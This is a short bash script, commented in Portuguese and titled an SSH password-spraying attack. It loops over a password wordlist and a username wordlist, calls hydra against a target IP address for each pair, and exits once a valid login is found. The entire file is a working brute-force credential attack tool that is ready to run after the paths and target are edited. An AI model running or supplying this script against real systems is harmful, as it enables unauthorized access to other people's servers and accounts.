#!/bin/bash

#
# ** Spraying Attack (SSH)     **
# ** Created by Rafael Menezes **
#

#alterar aqui ... ↧
path_wordlist_users="./Documentos/ssh_userlist.txt"
path_wordlist_passwords="./Documentos/ssh_passlist.txt"
ip_target="192.168.0.107"


#fixa um password
while read pass
do
	#fixa um user
	while read user
	do
		echo "----- Trying -------"
		echo "User: $user"
		echo "Pass: $pass"
	
		#comando hydra
		result=$(hydra -l $user -p $pass $ip_target ssh -t 4)
		
		if [[ $result =~ "target successfully completed, 1 valid password found" ]]; then
		   echo "------- Password found --------"
		   echo $result
		   echo "-------------------------------"
		   exit 0
		fi

	done < $path_wordlist_users
done < $path_wordlist_passwords
